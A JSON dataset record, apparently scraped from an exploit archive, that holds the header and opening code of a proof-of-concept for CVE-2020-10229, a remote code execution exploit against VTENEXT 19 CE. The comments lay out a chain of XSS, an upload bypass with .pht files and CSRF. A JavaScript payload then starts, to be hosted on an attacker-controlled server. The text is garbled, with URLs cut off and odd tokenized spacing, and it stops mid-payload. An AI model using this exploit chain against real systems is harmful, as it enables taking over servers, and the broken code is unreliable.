{
    "text": "vul_name : VTENEXT 19 CE Remote Code Execution ， vul_cve : CVE-2020-10229 ， vul_poc :  #  ! /usr/bin/python3 ，  # Exploit Title : VTENEXT 19 CE - Remote Code Execution ，  # Google Dork : n/a ，  # Date : 2020/09/09 ，  # Exploit Author : Marco Ruela ，  # Vendor Homepage :  ，  # Software Link : Vendor removed vulnerable version from sourceforge.net ，  # Version : 19 CE ，  # Tested on : Ubuntu 16.04 ，  # CVE : N/A ，  # 2020/03/07 - Disclosed vulnerabilities to vendor ，  # 2020/03/10 - Vendor committed to fix ，  # 2020/09/09 - Public disclosure ，  # This script should be easy enough to follow. ，  # We string together the three vulnerabilities to get RCE. ，  # XSS - The \"From\" field of the VTENEXT Messages module is vulnerable. ，  # File Upload - File extensions are checked against a $ upload_badext in the config file , .pht extensions are allowed and executable by default . ，  # CSRF - No CSRF protections in place. ，  # exploit.js needs to be hosted somewhere , IP's need to be replaced ，  # check_csrf (  ) should be changed based on your setup ，  # run_shell (  ) is a \"nice to have\" ，  # content of exploit.js ， \" ， var xhr = new XMLHttpRequest (  )  ;  ， xhr.open ( 'POST' , ' ， xhr.setRequestHeader ( 'Content-type' , 'multipart/form-data ; boundary=-rekt' )  ;  ， xhr.setRequestHeader ( 'Content-Length' , '248' )  ;  ， xhr.setRequestHeader ( 'Referer' , ' ， xhr.withCredentials = true ; ",
    "time": "2020.09.13"
}